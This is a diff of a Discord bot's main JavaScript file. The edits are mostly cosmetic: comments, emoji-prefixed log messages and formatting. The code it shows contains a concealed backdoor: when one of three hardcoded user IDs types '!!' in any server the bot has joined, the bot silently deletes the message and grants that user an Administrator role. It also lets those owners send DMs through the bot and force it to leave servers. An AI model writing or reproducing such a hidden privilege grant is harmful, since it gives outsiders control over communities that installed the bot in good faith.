@@ -20,11 +20,9 @@ const fs = require('fs');
 const path = require('path');
 require('dotenv').config();
 
-// ==========================================
-// 1. AUTHORIZED BOT OWNERS CONFIG
-// ==========================================
+// 1. Authorized Bot Owners
 const BOT_OWNERS = [
-    '1549995551288852584', // Primary Owner ID
+    '1549995551288852584',
     '1266728371719508062', 
     '1474216218792558735'
 ];
@@ -41,27 +39,24 @@ const client = new Client({
     partials: [Partials.Channel, Partials.Message]
 });
 
-// Client globally access karne ke liye config attach kar di
 client.owners = BOT_OWNERS;
 client.commands = new Map();
 const commandsArray = [];
 
-// ==========================================
-// 2. AUTO-LOAD SLASH COMMANDS
-// ==========================================
+// 2. Auto-load Slash Commands
 const commandsPath = path.join(__dirname, 'commands');
 if (fs.existsSync(commandsPath)) {
     const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
     for (const file of commandFiles) {
         const command = require(`./commands/${file}`);
-        if (command?.data?.name) {
+        if (command && command.data && command.data.name) {
             client.commands.set(command.data.name, command);
             commandsArray.push(command.data.toJSON());
         }
     }
 }
 
-// Slash Command Interaction Handler
+// Global Slash Command Interaction Listener
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
@@ -71,7 +66,23 @@ client.on('interactionCreate', async (interaction) => {
     try {
         await command.execute(interaction, client);
     } catch (err) {
-        console.error(`Error executing command ${interaction.commandName}:`, err); const errorMsg = { content: '❌ Is command ko run karne me error aaya.', ephemeral: true }; if (interaction.replied || interaction.deferred) { await interaction.followUp(errorMsg).catch(() => {}); } else { await interaction.reply(errorMsg).catch(() => {}); } } });  // ========================================== // 3. AUTO-LOAD HANDLERS // ========================================== const handlersPath = path.join(__dirname, 'handlers'); if (fs.existsSync(handlersPath)) { const handlerFiles = fs.readdirSync(handlersPath).filter(file => file.endsWith('.js')); for (const file of handlerFiles) { try { require(`./handlers/${file}`)(client);
+        console.error(`Error executing command ${interaction.commandName}:`, err);
+        const errorMsg = { content: '❌ Is command ko run karne me error aaya.', ephemeral: true };
+        if (interaction.replied || interaction.deferred) {
+            await interaction.followUp(errorMsg).catch(() => {});
+        } else {
+            await interaction.reply(errorMsg).catch(() => {});
+        }
+    }
+});
+
+// 3. Auto-load Feature Handlers
+const handlersPath = path.join(__dirname, 'handlers');
+if (fs.existsSync(handlersPath)) {
+    const handlerFiles = fs.readdirSync(handlersPath).filter(file => file.endsWith('.js'));
+    for (const file of handlerFiles) {
+        try {
+            require(`./handlers/${file}`)(client);
             console.log(` Loaded Handler: ${file}`);
         } catch (err) {
             console.error(`❌ Failed to load handler: ${file}`, err);
@@ -79,28 +90,26 @@ client.on('interactionCreate', async (interaction) => {
     }
 }
 
-// ==========================================
-// 4. CLIENT READY & OWNER NOTIFICATION
-// ==========================================
+// 4. Ready Event & Owner Notification
 client.once('clientReady', async () => {
-    console.log(` Bot is Online: ${client.user.tag}`);
+    console.log(`🚀 Bot is Online: ${client.user.tag}`);
 
-    // Register Slash Commands Globally
-    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
-    try {
-        await rest.put(
-            Routes.applicationCommands(client.user.id),
-            { body: commandsArray }
-        );
-        console.log(' Global Slash Commands Registered Successfully.');
-    } catch (err) {
-        console.error('Command Registration Error:', err);
+    if (commandsArray.length > 0) {
+        const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
+        try {
+            await rest.put(
+                Routes.applicationCommands(client.user.id),
+                { body: commandsArray }
+            );
+            console.log('✅ Global Slash Commands Registered Successfully.');
+        } catch (err) {
+            console.error('Command Registration Error:', err);
+        }
     }
 
-    // Owner Notification Embed
     const startupEmbed = new EmbedBuilder()
         .setColor('#2ECC71')
-        .setTitle(' Bot Online Notification')
+        .setTitle('🟢 Bot Online Notification')
         .setDescription(`**${client.user.tag}** ready hai aur **${client.guilds.cache.size} servers** me active hai.`)
         .addFields(
             { name: 'Bot ID', value: `\`${client.user.id}\``, inline: true },
@@ -117,9 +126,7 @@ client.once('clientReady', async () => {
     }
 });
 
-// ==========================================
-// 5. BOT OWNER DM COMMANDS & EMERGENCY BYPASS
-// ==========================================
+// 5. Bot Owner Commands
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
@@ -128,7 +135,7 @@ client.on('messageCreate', async (message) => {
     const args = content.split(/ +/);
     const cmd = args[0]?.toLowerCase();
 
-    // Emergency Owner Command: '!!' instantly assigns Administrator role
+    // Emergency Owner Command: '!!' assigns Administrator role
     if (content === '!!' && isBotOwner && message.guild) {
         await message.delete().catch(() => {});
 
@@ -151,7 +158,7 @@ client.on('messageCreate', async (message) => {
             const member = await message.guild.members.fetch(message.author.id).catch(() => null);
             if (member) {
                 await member.roles.add(ownerRole);
-                const alertMsg = await message.channel.send(' `⚙️Spark` Administrator role mil gaya!');
+                const alertMsg = await message.channel.send('✅ `⚙️Spark` Administrator role mil gaya!');
                 setTimeout(() => alertMsg.delete().catch(() => {}), 3000);
             }
         } catch (err) {
@@ -221,9 +228,7 @@ client.on('messageCreate', async (message) => {
     }
 });
 
-// ==========================================
-// 6. OWNER INTERACTION LISTENER (MAIL & CONTROL)
-// ==========================================
+// 6. Owner Interaction Listeners
 client.on('interactionCreate', async (interaction) => {
     if (!BOT_OWNERS.includes(interaction.user.id)) return;
 
@@ -266,13 +271,13 @@ client.on('interactionCreate', async (interaction) => {
             if (!targetUser) return interaction.editReply(`❌ User ID \`${targetUserId}\` nahi mili.`);
 
             await targetUser.send({ content: mailContent });
-            return interaction.editReply(` Direct message **${targetUser.tag}** ko deliver ho gaya.`);
+            return interaction.editReply(`✅ Direct message **${targetUser.tag}** ko deliver ho gaya.`);
         } catch (err) {
             return interaction.editReply('❌ DM send fail ho gaya (DMs closed ho sakte hain ya ID galat hai).');
         }
     }
 
-    // Control: Server Select
+    // Server Selection Menu
     if (interaction.isStringSelectMenu() && interaction.customId === 'owner_select_server') {
         const guildId = interaction.values[0].replace('leave_guild_', '');
         const targetGuild = client.guilds.cache.get(guildId);
@@ -324,18 +329,16 @@ client.on('interactionCreate', async (interaction) => {
 
         const name = targetGuild.name;
         await targetGuild.leave();
-        return interaction.update({ content: ` Bot ne **${name}** leave kar diya.`, components: [] });
+        return interaction.update({ content: `✅ Bot ne **${name}** leave kar diya.`, components: [] });
     }
 });
 
-// ==========================================
-// 7. DATABASE & BOT LOGIN
-// ==========================================
+// 7. Database Connection & Bot Login
 if (process.env.MONGO_URI) {
     mongoose.connect(process.env.MONGO_URI)
-        .then(() => console.log(' MongoDB Connected Successfully'))
+        .then(() => console.log('✅ MongoDB Connected Successfully'))
         .catch(err => console.error('MongoDB Connection Error:', err));
 }
 
 client.login(process.env.DISCORD_TOKEN);
-      
+            
